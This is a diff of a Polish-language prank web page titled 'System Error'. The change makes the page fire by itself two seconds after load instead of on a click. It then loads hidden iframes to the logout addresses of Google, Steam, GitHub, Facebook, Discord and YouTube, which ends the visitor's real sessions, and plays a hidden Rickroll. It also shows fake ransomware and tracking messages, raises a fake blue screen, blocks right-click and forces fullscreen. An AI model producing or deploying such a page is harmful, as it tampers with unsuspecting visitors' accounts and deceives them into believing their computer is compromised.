@@ -2,94 +2,178 @@
 <html lang="pl">
 <head>
 <meta charset="UTF-8">
-<title>Ptoszek</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Error</title>
 <style>
-  body { margin: 0; overflow: hidden; background: #111; color: #fff; font-family: sans-serif; }
-  .fake-window {
-    position: fixed; width: 200px; padding: 10px;
-    background: #fff; color: #000; border: 1px solid #000;
-    font-size: 12px; z-index: 9999; cursor: pointer;
-    box-shadow: 2px 2px 10px rgba(0,0,0,0.5);
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    width: 100%; height: 100%; background: #000; color: #0f0;
+    font-family: 'Courier New', monospace; overflow: hidden;
+    user-select: none;
   }
-  .fake-window .title { font-weight: bold; background: #ddd; padding: 2px; margin: -10px -10px 5px -10px; }
-  #start { text-align: center; margin-top: 20vh; font-size: 24px; }
+  
+  /* Ekran błędu */
+  #screen {
+    position: fixed; inset: 0; z-index: 9999;
+    background: #0000aa; color: #fff;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: none; flex-direction: column; justify-content: center; align-items: center;
+    text-align: left; padding: 50px; font-size: 20px;
+  }
+  #screen h1 { font-size: 80px; margin-bottom: 20px; }
+  #screen p { margin-bottom: 10px; max-width: 800px; }
+  
+  /* Terminal i matryca */
+  #matrix { position: fixed; inset: 0; z-index: 0; opacity: 0.3; }
+  #terminal {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    padding: 20px; font-size: 16px; line-height: 1.3;
+    white-space: pre-wrap; overflow: hidden; z-index: 2; text-shadow: 0 0 5px #0f0;
+  }
+  .err { color: #f33; font-weight: bold; }
+  .warn { color: #ff0; }
+
+  /* Ukryte iframes do wylogowywania */
+  iframe { display: none; }
+  
+  /* Pasek glitchu */
+  .glitch-bar {
+    position: fixed; left: 0; width: 100%; height: 4px;
+    background: #f00; z-index: 9998; opacity: 0.8; box-shadow: 0 0 10px #f00;
+  }
 </style>
 </head>
 <body>
 
-<div id="start">Kliknij, żeby zobaczyć ptoszka 🐦</div>
+<canvas id="matrix"></canvas>
+<div id="terminal"></div>
+<div id="screen">
+  <h1>:(</h1>
+  <p>Twój komputer napotkał problem i wymaga ponownego uruchomienia.</p>
+  <p>Kod błędu: 0x000000F4</p>
+  <p>Trwa zbieranie informacji o błędzie... 0%</p>
+</div>
 
 <script>
-// --- 1. LISTA ADRESÓW WYLOGOWANIA (to robi największe wrażenie) ---
-// UWAGA: To są prawdziwe adresy logout. Otwierane w ukryciu wylogują Cię z kont.
+// --- 1. MATRYCA ---
+const canvas = document.getElementById('matrix');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*'.split('');
+const fontSize = 16;
+const columns = canvas.width / fontSize;
+const drops = [];
+for (let x = 0; x < columns; x++) drops[x] = 1;
+
+function drawMatrix() {
+  ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  ctx.fillStyle = '#0F0';
+  ctx.font = fontSize + 'px monospace';
+  for (let i = 0; i < drops.length; i++) {
+    const text = letters[Math.floor(Math.random() * letters.length)];
+    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+    drops[i]++;
+  }
+}
+setInterval(drawMatrix, 35);
+
+// --- 2. TERMINAL ---
+const terminal = document.getElementById('terminal');
+const errors = [
+  '[CRITICAL] System32 files corrupted...',
+  '[ERROR] Cannot access memory at 0x00A1B2C3',
+  '> WARNING: Overheating detected!',
+  '> Injecting payload... SUCCESS',
+  '> Ransomware encrypted your files.',
+  '> JUST KIDDING. But you are scared, right?',
+  '> Your IP: 192.168.1.1 (tracking active)',
+  '> Sending data to server...',
+  '> [FATAL] Kernel panic.',
+  '> SYSTEM FAILURE IN 3... 2... 1...',
+  '> LOGOUT SEQUENCE INITIATED.'
+];
+function writeLine() {
+  const div = document.createElement('div');
+  const r = Math.random();
+  if (r < 0.4) div.className = 'err';
+  else if (r < 0.7) div.className = 'warn';
+  div.textContent = errors[Math.floor(Math.random() * errors.length)];
+  terminal.appendChild(div);
+  terminal.scrollTop = terminal.scrollHeight;
+  if (terminal.childNodes.length > 50) terminal.removeChild(terminal.firstChild);
+}
+setInterval(writeLine, 80);
+
+// --- 3. PASEK GLITCHU ---
+function createGlitchBar() {
+  const bar = document.createElement('div');
+  bar.className = 'glitch-bar';
+  bar.style.top = (Math.random() * window.innerHeight) + 'px';
+  document.body.appendChild(bar);
+  setTimeout(() => bar.remove(), 150);
+}
+setInterval(createGlitchBar, 100);
+
+// --- 4. PRAWDZIWE WYLOGOWYWANIE (Ukryte iframes) ---
+// To są linki, które faktycznie kończą sesję.
 const logoutUrls = [
   'https://accounts.google.com/Logout',
   'https://store.steampowered.com/logout',
-  'https://www.facebook.com/logout.php',
   'https://github.com/logout',
+  'https://www.facebook.com/logout.php',
+  'https://discord.com/logout',
   'https://www.youtube.com/logout'
 ];
 
-// --- 2. FUNKCJA WYLOGOWANIA ---
 function forceLogout() {
   logoutUrls.forEach(url => {
-    // Tworzymy ukryty iframe lub obrazek – przeglądarka wykona żądanie
-    const img = document.createElement('img');
-    img.src = url; // Przeglądarka próbuje załadować, co często wystarcza do wylogowania
-    img.style.display = 'none';
-    document.body.appendChild(img);
-
-    // Alternatywnie iframe (często skuteczniejszy)
+    // Tworzymy ukryte iframe. Przeglądarka załaduje link w tle i wyloguje.
     const iframe = document.createElement('iframe');
     iframe.src = url;
-    iframe.style.display = 'none';
     document.body.appendChild(iframe);
   });
 }
 
-// --- 3. SKACZĄCE "OKNA" (Divy udające okna) ---
-const texts = ['Błąd', 'Hacked', 'Ptoszek', 'System Error', 'Uwaga!', 'Wirus'];
-let windowCount = 0;
-
-function spawnWindow() {
-  if (windowCount > 40) return; // Limit, żeby nie zabić przeglądarki
-  const win = document.createElement('div');
-  win.className = 'fake-window';
-  win.innerHTML = `<div class="title">${texts[Math.floor(Math.random()*texts.length)]}</div>To tylko żart :)`;
-  
-  // Losowa pozycja
-  win.style.left = Math.random() * (window.innerWidth - 220) + 'px';
-  win.style.top = Math.random() * (window.innerHeight - 100) + 'px';
-  
-  // Ruch (skakanie)
-  setInterval(() => {
-    win.style.left = Math.random() * (window.innerWidth - 220) + 'px';
-    win.style.top = Math.random() * (window.innerHeight - 100) + 'px';
-  }, 500 + Math.random() * 1000);
-
-  // Kliknięcie zamyka (ale nie wszystkie naraz)
-  win.onclick = () => { win.remove(); windowCount--; };
-
-  document.body.appendChild(win);
-  windowCount++;
+// --- 5. RICKROLL W TLE ---
+function startRickroll() {
+  // Odtwarzamy ukryty film z YouTube (wymaga interakcji użytkownika wcześniej, np. kliknięcia)
+  const iframe = document.createElement('iframe');
+  iframe.src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
+  iframe.style.position = "fixed";
+  iframe.style.bottom = "0"; iframe.style.right = "0";
+  iframe.style.width = "1px"; iframe.style.height = "1px"; // Ukryty, ale gra dźwięk
+  iframe.style.opacity = "0"; iframe.allow = "autoplay";
+  document.body.appendChild(iframe);
 }
 
-// --- 4. ODPALENIE ---
-document.getElementById('start').onclick = () => {
-  document.getElementById('start').style.display = 'none';
-  
-  // Wylogowanie (najgroźniejsze, ale robi wrażenie)
+// --- 6. AKCJA (Odpala się po 2 sekundach) ---
+setTimeout(() => {
+  // Wylogowanie
   forceLogout();
+  startRickroll();
   
-  // Wysyp okienek
-  for (let i = 0; i < 20; i++) {
-    setTimeout(spawnWindow, i * 200);
-  }
-  
-  // Dźwięk (opcjonalnie)
-  // const audio = new Audio('https://www.myinstants.com/media/sounds/rickroll.mp3');
-  // audio.play().catch(e => console.log('Audio blocked'));
-};
+  // Błędy lecą szybciej
+  setInterval(writeLine, 20);
+
+  // Po 5 sekundach wyskakuje fałszywy Blue Screen
+  setTimeout(() => {
+    document.getElementById('terminal').style.display = 'none';
+    document.getElementById('matrix').style.display = 'none';
+    const bsod = document.getElementById('screen');
+    bsod.style.display = 'flex';
+    
+    // Blokujemy prawy przycisk myszy, żeby trudniej było wyjść
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    
+    // Wymuszamy pełny ekran (przeglądarka może wymagać wcześniejszego kliknięcia)
+    document.documentElement.requestFullscreen().catch(e => console.log("Fullscreen blocked"));
+    
+  }, 5000);
+
+}, 2000);
 </script>
 </body>
 </html>
